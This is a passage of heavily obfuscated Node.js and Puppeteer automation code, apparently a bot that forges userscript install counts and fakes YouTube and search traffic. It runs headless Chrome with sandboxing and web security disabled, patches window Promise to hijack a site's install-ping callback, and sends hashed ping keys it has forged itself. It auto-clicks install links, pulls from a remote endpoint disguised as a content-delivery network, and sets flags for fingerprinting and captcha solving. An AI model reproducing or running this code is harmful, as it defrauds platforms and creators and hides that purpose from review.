                J[-0x4 * -0x47f + -0x1ccf + 0xae3] = this['block'], J[K >> 0x109b * -0x1 + 0x13 * 0x18e + -0xced] |= x[0x225c + 0x1065 + -0x32be & K], this['block'] = J[-0x3 * 0x34e + 0xed9 + 0x1 * -0x4df], K >= 0x55c * -0x7 + -0x9e5 * -0x1 + 0x1 * 0x1bd7 && (this['hashed'] || this['hash'](), J[-0x25 * -0x101 + 0x16cd + 0x1 * -0x3bf2] = this['block'], J[-0x5 * 0x2a1 + -0x241 * 0x7 + -0x212 * -0xe] = J[0x7e0 + -0x69 + -0x776 * 0x1] = J[-0xe89 * 0x1 + -0x2fc * 0x2 + 0x1483] = J[0x13 * -0x175 + -0x16c3 * -0x1 + 0x4ef] = J[0x17ec + -0x1f3 * -0xa + -0x2b66] = J[-0x15c1 + -0x1 * -0x5d1 + -0x2b * -0x5f] = J[-0x1 * 0x18b6 + -0x446 + 0x1d02] = J[0x1e7d + -0x1bb * -0x11 + 0x1 * -0x3be1] = J[-0x12e0 + 0xf3e + 0x3aa * 0x1] = J[0x1912 + 0xb0f + -0xc08 * 0x3] = J[0x29f + 0x193f + -0x1bd4] = J[-0x544 + -0x180 * -0xc + -0xcb1] = J[-0x269f + -0xa1 + 0x274c] = J[-0x10d9 + 0x5 * -0x471 + 0x271b] = J[0x18e * -0x2 + 0x1fa8 * 0x1 + -0x1c7e] = J[-0xd55 + 0xfb2 + -0x24e] = -0x17 * -0xca + -0xb03 + -0x723), J[0x229c * -0x1 + -0x1908 + 0x2 * 0x1dd9] = this['hBytes'] << 0xb62 + 0x163 * -0x13 + 0xefa | this['bytes'] >>> 0x16 * -0x1f + -0x535 + 0x7fc, J[-0x1 * 0x1a3b + -0x1020 + 0x2a6a] = this['bytes'] << 0x795 + -0xb7 * 0x11 + -0x45 * -0x11, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0xbb8 + -0x18f5 * -0x1 + -0x53b * 0x7; J < 0x1 * 0x2195 + 0x1a21 * 0x1 + 0x1db3 * -0x2; ++J)
                K = Q[J - (-0x107a + -0x1f71 + 0x17f7 * 0x2)] ^ Q[J - (-0x2 * -0x265 + 0x1316 * -0x2 + 0x216a)] ^ Q[J - (-0x1a9 * 0x6 + -0x1 * 0x1611 + 0x2015)] ^ Q[J - (0x1601 + -0x805 + -0xdec)], Q[J] = K << 0x1f52 + -0x1f4 * 0xd + 0x29 * -0x25 | K >>> 0xed2 * -0x1 + -0xee8 + -0x3 * -0x9f3;
              for (J = -0x1bed + -0x1cb5 + 0x38a2; J < 0x1 * -0x12f9 + 0xc * -0x21b + 0x2c51; J += -0x1083 + 0xe8 + 0xfa0)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x123 + 0x33 * 0xa1 + -0x2131 | L >>> -0xd90 + -0x3 * -0x1f6 + 0x7c9 * 0x1) + (M & N | ~M & O) + P + (0x9719db58 + 0x2db1 * 0x14db5 + -0x1 * 0x7826ece4) + Q[J] << 0x1f1c + 0x1b00 + -0x3a1c * 0x1) << 0x239b + -0xbc1 + -0x17d5 | P >>> 0x211b + -0x1 * 0x697 + -0x1a69) + (L & (M = M << -0xf90 + 0x5 * 0x74a + -0x14c4 | M >>> 0x19 * 0x119 + 0x1950 + 0x3 * -0x1195) | ~L & N) + O + (0x179609 + 0x26323 * -0x9be + 0x71acb28a) + Q[J + (-0x393 + -0x3d1 * -0x1 + 0x3d * -0x1)] << -0x2190 + -0x3fa * -0x4 + 0x14 * 0xe2) << -0x197f + -0x2502 + 0x6a * 0x97 | O >>> -0x13 * -0x45 + 0x1a * 0x178 + 0x18b * -0x1c) + (P & (L = L << -0x5 * 0x353 + -0x1 * 0x1f9b + 0xc16 * 0x4 | L >>> -0xf4e + -0x215d + 0x30ad) | ~P & M) + N + (0xdb * 0x7fd5f + -0x69fded62 + 0xbdaaa6b6) + Q[J + (-0x1599 + -0x5 * -0x2ad + 0x83a * 0x1)] << 0x1 * 0x98f + -0x1827 + -0x4 * -0x3a6) << 0x2dc * -0x5 + -0x131b * -0x1 + -0x4ca | N >>> 0x1028 + 0xe * 0x1e2 + -0x2a69) + (O & (P = P << -0x14b + 0x2 * -0x4a0 + 0xaa9 | P >>> -0x19c4 + 0x2009 + 0x643 * -0x1) | ~O & L) + M + (-0xe37e * 0x9e3 + -0xcd36e09 * 0x2 + -0x698b5 * -0x12f1) + Q[J + (0x6 * -0x33a + 0xe * 0x209 + -0x91f)] << 0x1 * 0xd30 + 0x10c0 + 0x1 * -0x1df0) << -0x1 * -0x1c65 + -0x15b + 0x1b05 * -0x1 | M >>> -0x20f8 + -0x3 * -0x511 + 0x4 * 0x478) + (N & (O = O << 0x773 * -0x1 + -0x1cec + -0x247d * -0x1 | O >>> 0x2c3 + 0x18 * 0xec + -0x18e1) | ~N & P) + L + (-0x51beacb * 0x1a + 0x24d9808a * 0x3 + 0x70cbd099 * 0x1) + Q[J + (0x2559 + 0x21af + -0xbd6 * 0x6)] << -0x2 * -0x11b4 + -0x2070 + -0xa * 0x4c, N = N << 0x2 * 0x66a + -0x723 * 0x1 + -0x593 | N >>> -0x172f * -0x1 + -0x1 * 0x144d + -0x2e0;
              for (; J < 0x15 * -0x1d0 + 0x2 * 0x1337 + -0x36; J += -0x31d * 0xb + 0x112f + 0x1115 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xf * 0x23f + -0x20 * -0x2f + 0x1bd6 | L >>> 0x5c1 * 0x4 + -0xa69 + -0x64 * 0x20) + (M ^ N ^ O) + P + (0x1 * -0x7f8fc957 + 0x2bb67 * 0x2b1d + 0x78a02d4d) + Q[J] << 0x1 * 0xcb9 + -0xb18 + -0x1a1) << 0x1f * 0x92 + -0xba7 + -0x602 | P >>> 0x1d4d + 0x18bc + -0x35ee) + (L ^ (M = M << 0xc96 + 0x1d85 + -0x3 * 0xdff | M >>> 0x9e4 + -0x1058 + 0x676) ^ N) + O + (-0x7593b9c7 + -0x8 * -0x15674116 + -0x1 * -0x39339cb8) + Q[J + (-0x1015 * -0x1 + 0x120 + -0x1134)] << -0x5 * 0x601 + 0x2659 * 0x1 + -0x854) << -0x125c + -0x1c5 * 0x4 + 0x1975 | O >>> 0x1 * 0x1689 + 0x8e * 0x43 + 0x1dcc * -0x2) + (P ^ (L = L << 0x14ec + 0x3ee * -0x5 + -0x128 | L >>> 0x31 * 0x89 + 0x2085 * -0x1 + -0x327 * -0x2) ^ M) + N + (0x7c4c8b * 0xe9 + 0x1 * -0xcce11bcd + -0x2a5 * -0x4c9c4f) + Q[J + (-0x1e55 + 0x1e00 + 0x57 * 0x1)] << 0x5c4 + 0x456 + -0xa1a) << 0x1 * -0x727 + -0x2699 + 0x2dc5 | N >>> -0x1 * 0x18d9 + -0x9c3 + 0x22b7 * 0x1) + (O ^ (P = P << -0x42c + -0x8b8 + 0xd02 | P >>> 0x752 * 0x2 + -0x12b2 + 0x10 * 0x41) ^ L) + M + (-0x7e3505a4 + 0x20 * -0x26577c5 + 0x139bde9e5) + Q[J + (-0x625 + 0x385 * -0xb + 0x2cdf)] << -0x29 * 0x82 + 0x1a8 * 0x1 + 0x132a) << 0x1 * -0xe7a + 0x2365 + -0x42e * 0x5 | M >>> -0x1b82 + 0x156f + -0xe * -0x71) + (N ^ (O = O << 0x15a3 * -0x1 + 0x7 * -0x47f + 0x353a | O >>> 0x1 * 0x1c72 + -0x1547 + -0x729) ^ P) + L + (0xa7a46f59 + 0x38a41b7f + -0x716e9f37) + Q[J + (-0x4f * 0x27 + -0x326 + 0xf33)] << 0x2524 * -0x1 + -0x1087 + 0xb * 0x4e1, N = N << 0x11b2 + -0xaeb + -0x6a9 | N >>> -0x20 * 0x78 + 0xc2e * 0x2 + -0x95a;
              for (; J < 0x89e + 0x7b1 + 0x337 * -0x5; J += 0xf * -0x1b7 + 0x1f4d * -0x1 + 0x390b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * 0x1e73 + -0xa0c + -0x1462 | L >>> -0x1bac + -0x7 * -0x18d + 0x10ec) + (M & N | M & O | N & O) + P - (-0xa3 * -0x6a9513 + -0xc4e7890b + 0x5de * 0x293c25) + Q[J] << 0x2 * 0xbd3 + -0x150d + 0x5f * -0x7) << -0x1829 + 0x7 * -0x2b9 + 0x2b3d | P >>> -0x91d + -0x1 * -0x2000 + 0x1b * -0xd8) + (L & (M = M << 0x22c6 + -0x2275 + -0x33 | M >>> -0x2 * -0xffb + -0x1467 * -0x1 + -0x345b) | L & N | M & N) + O - (0x17 * 0x83d0383 + 0x43 * -0x33d4c2 + -0x28a407 * 0x18d) + Q[J + (-0x2 * 0xa8b + 0x1fdb + -0x562 * 0x2)] << 0x136c + 0x27b * -0x5 + -0x257 * 0x3) << 0x8ae + -0x1 * -0x74c + -0x5 * 0x331 | O >>> 0x1d + -0x20 + 0x1e) + (P & (L = L << 0x43 * 0x19 + -0x134e * 0x1 + -0x1d7 * -0x7 | L >>> -0x1513 + 0x33f + 0x11d6) | P & M | L & M) + N - (-0xd2db47ae + 0x90aca92c * -0x1 + 0x27ffad * 0xbb6) + Q[J + (-0x904 + -0x8ec * 0x1 + 0x2 * 0x8f9)] << 0x617 * -0x2 + 0x1 * -0x1519 + -0x2147 * -0x1) << -0xf71 + -0x1780 + 0x26f6 | N >>> -0xa85 * 0x2 + -0xd8e + 0x22b3) + (O & (P = P << 0x12f7 * -0x2 + -0x1061 + 0x1 * 0x366d | P >>> -0x25f0 + 0x4d * -0x67 + 0x44ed) | O & L | P & L) + M - (-0x3 * -0x2f008543 + 0x1 * -0xcc0fc03a + 0xaff27395) + Q[J + (-0x10b * 0x1 + -0x1 * 0x2510 + 0xe * 0x2b9)] << -0x1adb + 0x1318 + 0x7c3) << -0xbef + -0x174c + 0x2340 | M >>> -0x68c + -0x1008 + -0x1 * -0x16af) + (N & (O = O << -0xa * -0x2e3 + 0x332 * -0x6 + 0x265 * -0x4 | O >>> 0x1ead + -0x140 * -0x17 + -0x1 * 0x3b6b) | N & P | O & P) + L - (-0x1c5d150f + -0x7a30454d * 0x1 + -0x20ee33b0 * -0x8) + Q[J + (-0x220c + -0x16d9 + -0x11 * -0x359)] << -0x11 * 0x141 + 0x13e6 + 0x16b, N = N << -0x215e + 0x2f * 0x5f + 0x100b | N >>> 0x76d + 0x1 * 0x224f + -0x29ba;
              for (; J < 0x8ef * 0x3 + -0x24a0 * 0x1 + -0x3 * -0x361; J += -0x714 + -0x12 * -0x15d + 0x2f * -0x5f)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5ab * -0x4 + -0x1a9e * -0x1 + -0x3145 | L >>> -0x1c5f + -0x1 * -0x2144 + -0x2 * 0x265) + (M ^ N ^ O) + P - (0x2f0f1af6 + -0x30b2b584 + 0x3740d8b8) + Q[J] << 0x7 * 0x3c3 + 0x2 * -0xded + 0x1 * 0x185) << -0x1e * -0x7f + 0x1c65 + -0x2b42 | P >>> -0x932 * 0x3 + -0xca3 + 0x2854 * 0x1) + (L ^ (M = M << -0x18fa + -0x1 * 0x10c7 + -0x4a7 * -0x9 | M >>> 0x159 + 0x1b21 + -0x1c78) ^ N) + O - (-0x6aa1 * 0x504c + -0x275dc984 + 0x7e6cff7a) + Q[J + (-0x243b * 0x1 + -0x19ed + 0x3e29 * 0x1)] << 0x196d + -0xa1 * -0x2c + 0x17 * -0x24f) << -0x7f1 + 0x2 * 0x8 + 0x151 * 0x6 | O >>> -0x6d * 0x1d + 0x1c * 0x107 + -0x3a * 0x48) + (P ^ (L = L << -0x10df + 0x101a + 0xe3 | L >>> -0x205e + -0x3 * 0x6c7 + 0x34b5) ^ M) + N - (-0x8187f88 + -0x14a43c81 + 0x2359 * 0x2546b) + Q[J + (0x1243 + 0x9e * -0x35 + 0x1 * 0xe75)] << 0xe * 0x119 + 0x3 * 0x13c + -0x1312) << -0xc2a * 0x3 + 0x5f8 + 0x1e8b * 0x1 | N >>> 0xbd2 + 0x137 * 0x10 + -0x1f27) + (O ^ (P = P << 0x1061 + -0xf2a + 0x1 * -0x119 | P >>> -0x1 * -0x2b2 + -0x1efd + 0x1c4d) ^ L) + M - (-0x17b * 0xd48b7 + -0x2dfccc8f + 0x7744b1a6) + Q[J + (0x1d87 + 0x2a * -0x1 + -0x1d5a)] << -0x1 * -0x1445 + 0x12eb + -0x2730) << 0x1e1 + 0x22f3 * -0x1 + 0x2b * 0xc5 | M >>> -0x14a1 + -0x57b + 0x1a37) + (N ^ (O = O << -0x19f + 0x229c + -0x20df | O >>> -0x1 * 0x853 + 0x1 * -0x1ce5 + -0x2 * -0x129d) ^ P) + L - (0xb * 0x1002d0d + 0x287f * -0x21643 + 0x1dcd16 * 0x444) + Q[J + (-0x3e * 0x65 + -0x43 * -0x4d + 0x453)] << -0x1402 + 0x1 * -0x1711 + -0x1 * -0x2b13, N = N << 0x2704 + 0x988 * -0x4 + 0x9 * -0x16 | N >>> -0x15c4 + 0x188e + -0x8 * 0x59;
              this['h0'] = this['h0'] + L << 0x78d * -0x4 + 0xf25 * -0x1 + 0x2d59, this['h1'] = this['h1'] + M << -0x1 * -0x1ed + -0x468 + 0x27b, this['h2'] = this['h2'] + N << 0xe * -0x223 + 0x6 * -0xc8 + -0x229a * -0x1, this['h3'] = this['h3'] + O << -0x125 + 0xe19 + -0xcf4, this['h4'] = this['h4'] + P << -0x12b1 + -0x1b54 + 0x3f * 0xbb;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x238a + 0x1dd6 + -0x4144 & -0x252 + 0xbdb * 0x3 + -0x90 * 0x3b] + w[J >> -0x1509 + 0x1ace + -0x5ad & 0x7 * 0x3f + 0x161a + 0x2 * -0xbe2] + w[J >> -0x1 * 0x889 + -0x183c + 0x20d9 & -0x1 * 0x43 + 0x11 * 0xf6 + -0x5 * 0x334] + w[J >> 0x191e + -0x20ab + 0x1 * 0x79d & 0x104f + -0x1 * -0x1b3c + 0x79 * -0x5c] + w[J >> 0x10a4 + 0x4df * 0x3 + -0x1f35 & 0x1f16 + 0x7dd * -0x1 + -0x172a] + w[J >> 0x22 * 0xa3 + 0x19b1 * 0x1 + -0x3 * 0xfc5 & 0xff2 + 0x1b0a + -0x2aed] + w[J >> 0x18e5 + 0x4 * -0x655 + 0x5 * 0x17 & 0xbcd + 0x11bb + -0x1d79] + w[0x26cd + -0x1e80 + -0x83e * 0x1 & J] + w[K >> 0x1f * 0x95 + 0xae * -0x10 + 0xd * -0x8b & -0x7 * 0x30b + -0x1b23 * -0x1 + -0x5c7] + w[K >> 0x65a + 0xafd * 0x1 + -0x113f & 0x1c06 + -0x1 * -0x8b4 + 0x95 * -0x3f] + w[K >> 0x7a2 * 0x1 + 0x92f + -0x10bd & -0x161b + -0x18a5 + 0x2ecf] + w[K >> -0x26eb + -0x12 * -0x139 + 0x18b * 0xb & 0x2345 + -0x3a6 * -0x9 + -0x440c] + w[K >> -0x2 * -0xa31 + 0x16 * -0xb2 + -0x50a & -0x2663 + 0x1af8 + 0xb7a] + w[K >> 0x5 * -0x12a + 0x10a5 + -0x9 * 0x133 & -0x26 * 0xd4 + 0x2 * 0x93b + -0x29d * -0x5] + w[K >> -0x206 * 0xc + 0x1 * 0x1946 + -0xfa & 0x17c9 * -0x1 + 0x49f * 0x2 + 0xe9a] + w[0x1a * 0x14c + -0x34 * -0x25 + -0x292d & K] + w[L >> 0x1a7c + -0x688 + -0x9ec * 0x2 & -0x39f + 0x1c5 + 0x1 * 0x1e9] + w[L >> -0x2c6 + -0x4ca * -0x2 + -0x6b6 & 0x225 * 0xd + 0x228b + -0x1f * 0x203] + w[L >> -0x22cd + -0xb75 + 0x2e56 & 0x3d9 * -0x7 + 0x51 * 0x25 + 0xf49] + w[L >> 0x1b22 + 0x3 * -0x547 + -0x3bf * 0x3 & 0x1297 + 0x261f + 0x1 * -0x38a7] + w[L >> 0x107 * -0x3 + -0xa * -0x3d6 + -0x233b * 0x1 & -0x1c2a + -0x1113 + 0x2d4c] + w[L >> 0x146f + -0xae8 + 0xdd * -0xb & -0x1bf4 + 0x12dc * -0x1 + -0xd * -0x39b] + w[L >> 0x3d7 * 0x6 + -0x23d9 + 0x43 * 0x31 & 0x142e + -0x219f + 0xd80] + w[-0x20d3 + -0x259 * -0x9 + 0xbc1 & L] + w[M >> -0xb * 0x36e + -0x21ec * 0x1 + 0xa7 * 0x6e & 0x1d52 + -0x22b4 + 0x571 * 0x1] + w[M >> 0x1 * 0x24b6 + -0x18e9 * 0x1 + 0x6f * -0x1b & 0x19a8 + 0x12aa + -0x9 * 0x4eb] + w[M >> -0x2d * 0xf + -0xf5f + 0x1216 & 0x2 * -0xf53 + 0xedd + 0x4 * 0x3f6] + w[M >> -0x8 * -0x4bb + -0x93f + 0x1e7 * -0xf & 0x50b * -0x2 + 0x1 * -0x2195 + -0x1d * -0x182] + w[M >> -0xd80 * 0x2 + 0x3 * -0x303 + -0x3 * -0xc07 & -0x13d * 0x1b + -0x1a6f + 0x3bed] + w[M >> -0x2441 * 0x1 + -0x67 * -0x19 + 0x1a3a & -0x1 * -0x3ac + -0x1ece * 0x1 + 0x1b31] + w[M >> -0xf02 + 0x2361 + 0x243 * -0x9 & 0xe * -0x22a + 0x1a22 + 0x439] + w[-0x1 * -0x2ba + -0x1b56 + 0x18ab & M] + w[N >> -0x2545 * 0x1 + -0x35 * 0x1a + 0x1 * 0x2ac3 & -0x193a * -0x1 + -0x2460 + -0x1 * -0xb35] + w[N >> 0x145 * 0x12 + 0x5 * -0x53b + 0x365 & 0xe * -0x165 + 0x6c3 + 0xcd2] + w[N >> -0x1df2 * 0x1 + -0x4 * -0x397 + 0xfaa * 0x1 & -0x1745 + -0x1bbd + 0x301 * 0x11] + w[N >> -0x2 * 0x355 + 0x1 * -0x1b1 + 0x1 * 0x86b & -0xee6 + -0x8be + 0x17b3] + w[N >> 0x16 * 0x1ac + 0x1b4 * 0xb + -0xc8 * 0x47 & 0x1d * -0xca + -0xc07 * 0x1 + -0x1 * -0x22f8] + w[N >> 0x2105 + 0x1c7c + -0x3d79 & -0x98d + -0x462 * 0x2 + 0x1260] + w[N >> -0x22f + -0x65f + 0x892 & 0x26e1 + 0x26e3 * 0x1 + 0x417 * -0x13] + w[-0x1e56 * -0x1 + -0x8f * 0x29 + -0xec * 0x8 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x296 * -0xc + 0x1980 + 0x1e0 * 0x3 & -0x87d + 0x6af + 0x2cd,
                J >> -0x1bf2 + 0x22 * 0x6b + 0xdcc & 0xcad + -0x1eb * 0x7 + -0x1bf * -0x1,
                J >> -0x1eb * -0x3 + 0xcc6 * -0x1 + 0x70d & 0x1a19 + 0x12d8 + -0x2bf2,
                0x131 * -0x1a + -0x2 * 0x1a5 + -0x1 * -0x2343 & J,
                K >> -0x8a8 + 0x83d + -0x1 * -0x83 & 0x145d * 0x1 + 0x24dd + -0x383b,
                K >> -0xa39 * -0x1 + 0x1b * -0xc0 + 0xa17 & -0x239 + -0x15e7 + 0x191f,
                K >> 0xab9 * -0x2 + 0x21c4 + 0xb * -0x11e & -0x1435 + 0x795 * 0x1 + 0xd9f,
                -0x613 + -0x112e + -0x10 * -0x184 & K,
                L >> -0x217 * 0x6 + 0x20a + 0xa98 & -0x63f + 0xa * -0x1a0 + 0x177e,
                L >> 0x1 * 0xd9d + 0x2109 + -0x2e96 & -0x13b6 * -0x1 + 0x1 * -0x1659 + 0x3a2,
                L >> -0x2496 + 0x19d5 + -0xb * -0xfb & 0x1 * 0x194b + 0x196 * 0x10 + -0x31ac,
                0x16b7 + 0x2f * -0x57 + 0x1 * -0x5bf & L,
                M >> 0x5db + -0x1417 + -0x395 * -0x4 & -0x27c * -0x1 + 0x263f * 0x1 + 0x1 * -0x27bc,
                M >> -0x3b * 0x5d + -0x6ec + 0x1 * 0x1c6b & 0x77f + -0x52e + -0x2 * 0xa9,
                M >> -0x527 * 0x4 + 0x544 * 0x2 + 0xa1c & -0x251 * -0x1 + 0x868 * 0x4 + -0x22f2,
                0x1155 + -0x1953 + 0x8fd & M,
                N >> 0x7 * 0x3cb + -0x56f * -0x7 + -0x4f6 * 0xd & -0x2606 + 0xfd + 0x2608,
                N >> 0xc8b + -0x1 * 0x79b + -0xd0 * 0x6 & 0xa5 + 0x270d + -0x26b3,
                N >> 0x43 * -0x2f + -0x9b5 + 0x160a & 0x1044 + 0x4 * 0x65b + 0x1 * -0x28b1,
                -0x36 * -0x4b + -0x43b + -0xa98 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x3 * -0x38b + 0x1154 + 0x5 * -0x153), (K = new DataView(J))['setUint32'](-0x84b + -0x173 * -0x5 + 0x10c, this['h0']), K['setUint32'](0x200e + -0x8b * -0x43 + -0x446b, this['h1']), K['setUint32'](0x9 * -0x54 + 0x31c + -0x20, this['h2']), K['setUint32'](0x1 * 0x1ead + 0x127b + 0x311c * -0x1, this['h3']), K['setUint32'](-0x23f5 + -0x101 * -0x1 + 0x2304, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1d45 + 0x256f + -0x42b4];
        return window[U(0x2)] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x23a * -0xe + -0x1c54 + 0x3b80;
            J[-0x2 * 0x30f + 0x2387 + 0x1 * -0x1d69]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x1bda + 0x6 * -0x164 + -0x1c6 * 0xb] = L => {
              const V = b;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te'](V(0x7, '(OER') + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2 * 0xf07 + 0x16bd * -0x1 + 0x34cc * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x226b + 0xa * -0x1a9 + -0x3 * 0x5f0;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          const W = b;
          I[W(0x5, '#L0K')]();
        }, -0x237d + 0x13 * -0xd3 + -0x3902 * -0x1), Promise['resolve'](-0x1 * 0x518 + 0x27 * 0xbc + -0x178b);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2188 + -0x1 * 0x1405 + -0x1 * -0x358d; j < 0x1e51 + 0x61 * 0x56 + -0x3ee6; j++)
    i();
}
const NETWORK_PATIENCE = -0x2b7b + -0xd0f * 0x3 + 0x71e8 + (0x198 + 0x23b * 0xd + 0x12df * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x7c1 + -0x769 * -0x2 + -0x1690) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2451 + 0x1bd3 * 0x1 + -0x2012 * 0x2);
    let h = e[f];
    if (c['wXcCuS'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x1dcb + -0xc * 0x75 + -0x7 * 0x379, r, s, t = 0x2 * -0xa0 + 0x1cee + -0x1 * 0x1bae; s = m['charAt'](t++); ~s && (r = q % (-0x2 * -0x322 + 0x89e + -0x15a * 0xb) ? r * (0xe9f + 0x7db * 0x4 + -0x2dcb) + s : s, q++ % (-0x1 * 0x56b + -0x1a44 + 0x1fb3)) ? o += String['fromCharCode'](0x6 * 0x18c + -0x3a + -0x80f & r >> (-(-0x39a * 0x5 + 0x1f02 + -0xcfe) * q & 0x272 * 0x2 + -0x1b7 * -0x2 + -0x84c)) : 0x1 * 0x1237 + 0x24f4 * -0x1 + 0x3 * 0x63f) {
          s = n['indexOf'](s);
        }
        for (let u = -0x3 * -0x4f + 0x2 * 0xaff + 0x16eb * -0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0x499 + -0xbf7 + 0x10a0 * 0x1))['slice'](-(-0x17 * 0x23 + -0x8d2 * -0x4 + -0x2021));
        }
        return decodeURIComponent(p);
      };
      c['uUZGfz'] = i, b = arguments, c['wXcCuS'] = !![];
    }
    const j = e[-0x9af * -0x1 + -0x1d8 + -0x1 * 0x7d7],
      k = f + j,
      l = b[k];
    return !l ? (h = c['uUZGfz'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + X(0xc),
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x103 * 0x1f + 0x3 * 0x441 + 0x1 * -0x2c20; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 